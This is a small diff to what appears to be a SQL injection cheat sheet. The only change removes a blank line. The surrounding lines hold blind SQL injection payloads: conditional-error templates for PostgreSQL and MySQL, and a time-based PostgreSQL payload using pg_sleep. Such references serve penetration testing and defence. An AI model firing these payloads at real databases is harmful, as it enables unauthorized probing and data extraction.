@@ -67,7 +67,6 @@ SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END
 #Working PostgreSQL Statement 
 (SELECT CASE WHEN count((SELECT(SELECT CASE WHEN count(( SELECT 1 ))<>0 THEN pg_sleep(5) ELSE $$$$ END)))<>0 THEN true ELSE false END) --
 
-
 #MySQL  
 SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')  
 
